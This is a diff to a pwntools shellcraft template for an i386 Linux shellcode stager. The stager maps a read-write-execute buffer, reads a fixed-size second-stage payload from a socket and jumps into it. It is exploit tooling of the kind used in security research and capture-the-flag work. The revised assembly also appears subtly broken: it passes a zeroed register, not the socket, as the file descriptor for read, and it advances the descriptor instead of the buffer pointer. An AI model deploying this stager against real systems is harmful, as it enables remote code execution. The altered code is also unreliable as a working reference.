@@ -1,5 +1,7 @@
 <% from pwnlib.shellcraft import common %>
-<% from pwnlib.shellcraft import i386 %>
+<% from pwnlib.shellcraft.i386 import push, mov %>
+<% from pwnlib.shellcraft.i386.linux import syscall %>
+<% from pwnlib.constants import SYS_mmap2, PROT_EXEC, PROT_WRITE, PROT_READ, MAP_ANON, MAP_PRIVATE, SYS_read %>
 <%docstring>
 Recives a fixed sized payload into a mmaped buffer
 Useful in conjuncion with findpeer.
@@ -11,31 +13,32 @@ Args:
 <%
     stager = common.label("stager")
     looplabel = common.label("read_loop")
-    errlabel = common.label("error")
+    errlabel  = common.label("error")
+    rwx       = PROT_EXEC | PROT_WRITE | PROT_READ
+    anon_priv = MAP_ANON | MAP_PRIVATE
 %>
+    ${push(sock)}
 ${stager}:
-    push ${sock}
-    ${i386.linux.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANON | MAP_PRIVATE', -1, 0)}
-    mov ecx, eax
-    pop ebx /* sock */
-    push ecx /* save for: pop eax; call eax later */
-    ${i386.mov("edx", size)}
+    ${mov('ebx', 0)}
+    ${syscall(SYS_mmap2, 'ebx', size, rwx, anon_priv, -1, 'ebx')}
+
+    pop  ebp /* socket */
+    push eax /* save for: pop eax; call eax later */
 
 /* read/recv loop */
+    mov ecx, eax
+    ${mov("edx", size)}
 ${looplabel}:
-    ${i386.linux.syscall('SYS_read', 'ebx', 'ecx', 'edx')}
+    ${syscall(SYS_read, 'ebx', 'ecx', 'edx')}
 % if handle_error:
     test eax, eax
     js ${errlabel}
 % endif
+    add ebx, eax
     sub edx, eax
-    add ecx, eax
-    test edx, edx
-    jne ${looplabel}
+    jnz ${looplabel}
 
-    pop eax /* start of mmaped buffer */
-    push ebx /* sock */
-    call eax /* jump and hope for it to work */
+    ret /* start of mmapped buffer, ebp = socket */
 
 % if handle_error:
 ${errlabel}:
